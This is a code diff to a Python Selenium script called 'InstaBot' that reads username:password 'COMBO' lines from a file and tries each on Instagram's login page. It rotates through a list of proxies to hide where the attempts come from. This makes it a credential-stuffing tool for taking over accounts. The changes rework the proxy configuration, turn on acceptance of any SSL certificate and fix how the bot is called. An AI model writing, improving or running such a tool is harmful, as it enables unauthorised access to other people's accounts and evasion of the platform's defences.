@@ -23,32 +23,36 @@ m = 0
 
 
 class InstaBot:
-    def __init__(self, username, password, i, socks_4f, socks_proxy='N'):
+    def __init__(self, username, password, i, socks_4f, socks_proxy):
         try:
             if socks_4f != 'N':
-                # configure ChromeOptions class
-                chrome_options = webdriver.ChromeOptions()
-                # proxy parameter to options
-                chrome_options.add_argument(
-                    '--proxy-server=%s' % str(socks_proxy))
-                # options to Chrome()
-                driver = webdriver.Chrome(
-                    "/home/robert/Desktop/chromedriver", chrome_options=chrome_options)
-                driver.implicitly_wait(0.6)
-                driver.get(
-                    "https://www.instagram.com/accounts/login/?source=auth_switcher")
-                time.sleep(getRandomTime())
-                river.find_element_by_xpath(
-                    "//input[@name=\"username\"]").send_keys(username)
-                driver.find_element_by_xpath(
-                    "//input[@name=\"password\"]").send_keys(password)
+                webdriver.DesiredCapabilities.CHROME['proxy'] = {
+                    "httpProxy": socks_proxy,
+                    "ftpProxy": socks_proxy,
+                    "sslProxy": socks_proxy,
+                    "proxyType": "MANUAL",
 
-                time.sleep(getRandomTime())
-                driver.find_element_by_xpath(
-                    '//button[@type="submit"]').click()
-            else:
+                }
+              # configure ChromeOptions class
+            webdriver.DesiredCapabilities.CHROME['acceptSslCerts'] = True
+            driver = webdriver.Chrome(
+                "C:\\Users\\lavon\\Desktop\\Chrome\\chromedriver")
+            driver.implicitly_wait(0.6)
+            driver.get(
+                "https://www.instagram.com/accounts/login/?source=auth_switcher")
+            time.sleep(getRandomTime())
+            driver.implicitly_wait(10)
+            driver.find_element_by_xpath(
+                "//input[@name=\"username\"]").send_keys(username)
+            driver.find_element_by_xpath(
+                "//input[@name=\"password\"]").send_keys(password)
+
+            driver.find_element_by_xpath(
+                '//button[@type="submit"]').click()
+
+            if socks_4f == 'N':
                 driver = webdriver.Chrome(
-                    "/home/robert/Desktop/chromedriver")
+                    "C:\\Users\\lavon\\Desktop\\Chrome\\chromedriver")
                 driver.implicitly_wait(0.6)
                 driver.get("https://www.instagram.com/accounts/login/")
                 time.sleep(getRandomTime())
@@ -93,9 +97,10 @@ for line in r_file:
     print("\nCOMBO: ", User, ":", Password)
     if socks_4f != 'N':
         socks_proxy = str(socks[i])
-        InstaBot(User, Password, i, socks_proxy)
+        InstaBot(User, Password, i, socks_4f, socks_proxy)
         print("\nSOCKS: " + socks_proxy)
-    InstaBot(User, Password, i, socks_4f)
+    if socks_4f == 'N':
+        InstaBot(User, Password, i, socks_4f)
     print("\n<Error Wrong Login>")
     if socks_4f != 'N':
         if i == len(socks) - 1:
